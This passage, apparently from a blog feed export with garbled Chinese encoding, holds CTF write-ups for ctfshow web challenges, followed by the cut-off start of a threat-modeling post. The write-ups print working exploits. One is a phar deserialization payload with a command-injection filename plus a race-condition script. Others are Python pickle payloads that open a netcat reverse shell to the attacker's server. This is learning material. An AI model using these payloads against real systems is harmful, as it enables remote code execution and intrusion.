https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile &amp;&amp; <span class="keyword">$this</span>-&gt;admin)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>emmï¼Œåœ¨ä¸Šé¢˜åŸºç¡€ä¸Šæ–°å¢äº†ä¸ªåˆ¤æ–­ <code>$this-&gt;admin</code> ç„¶åæƒ³ç€ï¼Œæ„é€ ä¸€ä¸‹åºåˆ—åŒ–ä¸å°±è¡Œäº†å˜›ï¼Œç„¶åå‘ç°æ²¡æœ‰ååºåˆ—åŒ–å‡½æ•°ã€‚ã€‚</p><p>çœ‹äº†ä¸‹å‘ç°å¯ä»¥é€šè¿‡ <code>file_put_contents</code> å†™ pharæ–‡ä»¶ï¼Œç„¶åé¢˜ç›®ä¸­ <code>file_put_contents</code> ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>phar://</code>  åè®®ï¼Œé€šè¿‡ <code>$content</code> ä¼ å…¥ phar æ•°æ®ï¼Œè¿™æ ·åœ¨ PHP é€šè¿‡ <code>phar://</code>  åè®®è§£ææ•°æ®æ—¶ï¼Œä¼šå°† <code>meta-data</code> éƒ¨åˆ†è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>ä¸è¿‡é¢˜ç›®ä¼šåˆ é™¤æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦åœ¨åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œæ–‡ä»¶è¿›è¡Œä»¥ä¸Šæ“ä½œï¼Œå› æ­¤è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå³ç”Ÿæˆäº† phar æ–‡ä»¶ï¼Œåœ¨æçŸ­æ—¶é—´å†…æ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œå› ä¸ºæ‰§è¡Œåˆ° <code>unlink</code> å‡½æ•°å‰è¿˜æœ‰ä¸€ä¸ª <code>copy</code> æ–‡ä»¶æ“ä½œï¼Œç£ç›˜ io æ˜¯éœ€è¦ä¸€å®šæ—¶é—´çš„ã€‚åªè¦æˆ‘ä»¬ä¸æ–­åœ¨å†™å…¥ phar æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥æ–­æ–­ç»­ç»­è®¿é—®åˆ°~</p><p>poc</p><p>pharæ„é€ å¦‚ä¸‹ï¼Œä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ <code>evil.phar</code> æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åç¼€å¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;evil.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="comment">// è®¾ç½® stubb, å¢åŠ  gif æ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span></span><br><span class="line"><span class="comment"> * è¿™ä¸ªå‡½æ•°éœ€è¦åœ¨php.iniä¸­ä¿®æ”¹ phar.readonly ä¸º Off</span></span><br><span class="line"><span class="comment"> * å¦åˆ™çš„è¯ä¼šæŠ›å‡º </span></span><br><span class="line"><span class="comment"> * creating archive &quot;***.phar&quot; disabled by the php.ini setting phar.readonly </span></span><br><span class="line"><span class="comment"> * å¼‚å¸¸.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="comment">// æ·»åŠ éœ€å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¡ä»¶ç«äº‰ï¼Œpy3è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">url = <span class="string">&#x27;http://0f5a5b64-ef6b-4317-b093-3f2fc62f1df9.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">pre_resp = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> pre_resp.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">&#x27;\né“¾æ¥å¥½åƒæŒ‚äº†....&#x27;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    requests.post(url+<span class="string">&quot;?fn=evil.phar&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://evil.phar/&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64encode(r.text.encode()))</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=upload)</span><br><span class="line">    b = threading.Thread(target=read)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675946230-94b38f84-cbdd-423b-9023-0780626093f1.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675946230-94b38f84-cbdd-423b-9023-0780626093f1.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>base64è§£ç ä¸€ä¸‹å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675961865-54d050eb-f5a5-47cf-bd3f-7f5cdd80bf5c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617675961865-54d050eb-f5a5-47cf-bd3f-7f5cdd80bf5c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é¢˜å¤–</p><p>é™¤äº† file_put_contents å¤–ï¼Œä¼šæŠŠ phar ååºåˆ—åŒ–çš„å‡½æ•°è¿˜æœ‰ï¼š</p><table><thead><tr><th>å—å½±å“çš„å‡½æ•°åˆ—è¡¨</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>filename</td><td>filectime (è·å–æ–‡ä»¶çš„inodeæ›´æ”¹æ—¶é—´)</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup (è·å–æ–‡ä»¶çš„ç»„å)</td><td>fopen</td></tr><tr><td>fileinode ï¼ˆè·å–æ–‡ä»¶inodeï¼‰</td><td>filemtime ï¼ˆè·å–æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼‰</td><td>fileowner</td><td>fileperms ï¼ˆè·å–æ–‡ä»¶æƒé™ï¼‰</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link ï¼ˆåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦ä¸ºç¬¦å·é“¾æ¥ï¼‰</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file ï¼ˆè§£æé…ç½®æ–‡ä»¶ï¼‰</td></tr><tr><td>copy</td><td>unlink</td><td>stat ï¼ˆè·å–æ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼‰</td><td>readfile ï¼ˆè¾“å…¥æ–‡ä»¶å†…å®¹ï¼‰</td></tr></tbody></table><p>è¡¨æ ¼å‚è€ƒè‡ªï¼š<a href="https://v0w.top/2020/03/12/phar-unsearise/">https://v0w.top/2020/03/12/phar-unsearise/</a></p><h2 id="web277-python-ååºåˆ—åŒ–"><a href="#web277-python-ååºåˆ—åŒ–" class="headerlink" title="web277 python ååºåˆ—åŒ–"></a>web277 python ååºåˆ—åŒ–</h2><span class='btn'><a class="button"  title='Werkzeug/1.0.1'><i class='fas fa-tag'></i>Werkzeug/1.0.1</a></span> <span class='btn'><a class="button"  title='Python/3.7.9'><i class='fas fa-tag'></i>Python/3.7.9</a></span> <span class='btn'><a class="button"  title='pickle ååºåˆ—åŒ–'><i class='fas fa-tag'></i>pickle ååºåˆ—åŒ–</a></span><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617676250860-9c340753-befe-4218-9e17-354aeefe211c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617676250860-9c340753-befe-4218-9e17-354aeefe211c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>Pythonååºåˆ—åŒ–ï¼Œä¹‹å‰æœ‰è¿‡ä¸€äº›ç ”ç©¶ï¼Œæ™šç‚¹æŠŠPythonååºåˆ—åŒ–åŸºç¡€é“¾æ¥æ›´æ–°ä¸Šæ¥~</p><p>å°è¯•äº†å¾ˆå¤šï¼Œå‘ç°æ˜¯æ— å›æ˜¾çš„ï¼Œéœ€è¦åå¼¹shell</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system, (<span class="string">&#x27;nc æœåŠ¡å™¨ip æœåŠ¡å™¨ç«¯å£ -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">exp = Exp()</span><br><span class="line">s = pickle.dumps(exp)</span><br><span class="line">s_base64 = base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7a111fcd-ce76-4dde-9c49-5aec7f2bd40f.challenge.ctf.show:8080/backdoor&#x27;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: s_base64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(url, params)</span><br></pre></td></tr></table></figure><p>å…ˆåœ¨æœåŠ¡å™¨ä¸Šç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7779</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677765480-1392c727-ac55-455e-b57f-a64345bd9d22.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677765480-1392c727-ac55-455e-b57f-a64345bd9d22.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è¿è¡Œè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 web277.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677787035-afdc4c00-e0a7-4521-b039-0987615a0de2.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677787035-afdc4c00-e0a7-4521-b039-0987615a0de2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å›åˆ°æœåŠ¡å™¨ä¸Š <code>cat</code> ä¸€ä¸‹å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677820591-9fac3e0e-5139-4f1d-abe4-7e68e8beaffa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677820591-9fac3e0e-5139-4f1d-abe4-7e68e8beaffa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web278-python-ååºåˆ—åŒ–-ç®€å•ç»•è¿‡"><a href="#web278-python-ååºåˆ—åŒ–-ç®€å•ç»•è¿‡" class="headerlink" title="web278 python ååºåˆ—åŒ– ç®€å•ç»•è¿‡"></a>web278 python ååºåˆ—åŒ– ç®€å•ç»•è¿‡</h2><span class='btn'><a class="button"  title='Werkzeug/1.0.1'><i class='fas fa-tag'></i>Werkzeug/1.0.1</a></span> <span class='btn'><a class="button"  title='Python/3.7.9'><i class='fas fa-tag'></i>Python/3.7.9</a></span> <span class='btn'><a class="button"  title='pickle ååºåˆ—åŒ–'><i class='fas fa-tag'></i>pickle ååºåˆ—åŒ–</a></span><p>å’Œ web277 å·®ä¸å¤šï¼Œåªä¸è¿‡è¿‡æ»¤äº† systemï¼Œæ¢ä¸ªå‡½æ•°å³å¯</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exp</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen, (<span class="string">&#x27;nc æœåŠ¡å™¨ip æœåŠ¡å™¨ç«¯å£ -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">exp = Exp()</span><br><span class="line">s = pickle.dumps(exp)</span><br><span class="line">s_base64 = base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e281b968-e161-414c-bd80-c7a79045351e.challenge.ctf.show:8080/backdoor&#x27;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: s_base64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(url, params)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677963888-8c9d78ca-efe7-42c4-8078-d7b17de96728.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617677963888-8c9d78ca-efe7-42c4-8078-d7b17de96728.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>ä¸€äº›å‚è€ƒçš„é¢˜è§£</strong></p><div class="note link green"><p><a href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a> (ç›®æ ‡wpï¼Œæ¡†æ¶é¢˜ä¹Ÿæœ‰è‡ªå·±åˆ†æï¼Œè†œæ‹œï¼) <a href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a> <a href="https://blog.csdn.net/weixin_43578492/article/details/112128767">https://blog.csdn.net/weixin_43578492/article/details/112128767</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctfç»ƒä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctfç»ƒä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¨èƒå»ºæ¨¡å®‰å…¨åŸºç¡€çŸ¥è¯†</title>
      <link href="2021/04/04/thread-modeling/"/>
      <url>2021/04/04/thread-modeling/</url>
      
        <content type="html"><![CDATA[<p>å®ä¹ è¿‡ç¨‹ä¸­é›¶é›¶ç¢ç¢å­¦äº†ä¸€äº›ï¼Œä½†è¿˜æ²¡ç³»ç»Ÿå­¦è¿‡ï¼Œå‘ç°å¾®è½¯æœ‰ä¸ªæŒºå…¨é¢çš„ï¼Œæ‰“ç®—ç³»ç»Ÿå­¦ä¹ ä¸€æ³¢~</p><p><a href="https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/">https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/</a></p><p>æ„Ÿè§‰è®²çš„ç‰¹åˆ«å¥½â€¦æ‰€ä»¥å°±ç›´æ¥ç´¢æ€§ä¸€è¾¹çœ‹ä¸€è¾¹è¡¥å……çš„ <strong>copy</strong> ä¸‹æ¥äº†</p><h2 id="å¨èƒå»ºæ¨¡ç®€ä»‹"><a href="#å¨èƒå»ºæ¨¡ç®€ä»‹" class="headerlink" title="å¨èƒå»ºæ¨¡ç®€ä»‹"></a>å¨èƒå»ºæ¨¡ç®€ä»‹</h2><p>å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰åŠ©äºä¿æŠ¤ç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ç½‘ç»œå’ŒæœåŠ¡çš„æœ‰æ•ˆæŠ€æœ¯ã€‚å®ƒå¯å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸç¡®å®šæ½œåœ¨çš„å¨èƒå’Œé™ä½é£é™©ç­–ç•¥ã€‚</p><p>å¨èƒå»ºæ¨¡ä½¿ç”¨ä»¥å›¾å½¢å½¢å¼æ¼”ç¤ºç³»ç»Ÿå·¥ä½œæ–¹å¼çš„æ•°æ®æµå…³ç³»å›¾ã€‚ä¹‹åï¼Œå®ƒåº”ç”¨ä¸€ä¸ªæ¡†æ¶æ¥å¸®åŠ©ä½ å‘ç°å’Œä¿®å¤å®‰å…¨é—®é¢˜ã€‚</p><p>å¦‚æœæœªé¦–å…ˆå»ºç«‹å¨èƒæ¨¡å‹è€Œå‘å¸ƒç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿå°†ä½¿ä½ çš„å®¢æˆ·å’Œç»„ç»‡é¢ä¸´é£é™©ã€‚</p><div class="note info"><p>ç®€å•èµ·è§ï¼Œæ­¤å­¦ä¹ è·¯å¾„å°†ç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ç»Ÿç§°ä¸ºç³»ç»Ÿã€‚</p></div><h3 id="ä½•æ—¶ä½¿ç”¨å¨èƒå»ºæ¨¡"><a href="#ä½•æ—¶ä½¿ç”¨å¨èƒå»ºæ¨¡" class="headerlink" title="ä½•æ—¶ä½¿ç”¨å¨èƒå»ºæ¨¡"></a>ä½•æ—¶ä½¿ç”¨å¨èƒå»ºæ¨¡</h3><p>åœ¨è®¾è®¡æ–°ç³»ç»Ÿæˆ–æ›´æ–°ç°æœ‰ç³»ç»Ÿæ—¶ï¼Œå¯ä½¿ç”¨å¨èƒå»ºæ¨¡ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>åˆ›å»ºæ–°çš„ Azure å¾®æœåŠ¡ï¼Œç”¨äºæŠ¥å‘Šç»„ç»‡çš„äº‘èµ„æºä½¿ç”¨æƒ…å†µä»¥ä¾¿è¿›è¡Œé¢„ç®—</li><li>è®¾è®¡å…¬å…± API ä»¥å‘å®¢æˆ·æä¾›å¯¹æ•°æ®çš„è®¿é—®æƒé™</li><li>å‘ç°æœ‰åº”ç”¨ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½</li></ul><h3 id="è°å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡"><a href="#è°å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡" class="headerlink" 